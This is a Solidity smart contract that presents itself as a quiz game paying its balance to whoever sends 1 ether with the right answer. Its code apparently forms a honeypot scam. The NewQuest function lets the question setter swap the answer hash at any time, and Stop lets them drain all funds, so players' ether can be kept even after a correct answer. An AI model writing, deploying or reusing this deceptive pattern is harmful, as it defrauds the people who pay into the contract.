contract NextQuest
{
    string public Question;
    address questionSender;
    bytes32 responseHash;

    function Play(string resp) public payable {
        require(msg.sender == tx.origin);
        if (responseHash == keccak256(resp) && msg.value >= 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function() public payable{}
 
    function Setup(string q, string resp) public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(resp);
            Question = q;
            questionSender = msg.sender;
        }
    }
    
    function Stop() public payable {
       require(msg.sender==questionSender);
       msg.sender.transfer(address(this).balance);
    }
    
    function NewQuest(string q, bytes32 respHash) public payable {
        require(msg.sender==questionSender);
        Question = q;
        responseHash = respHash;
    }
}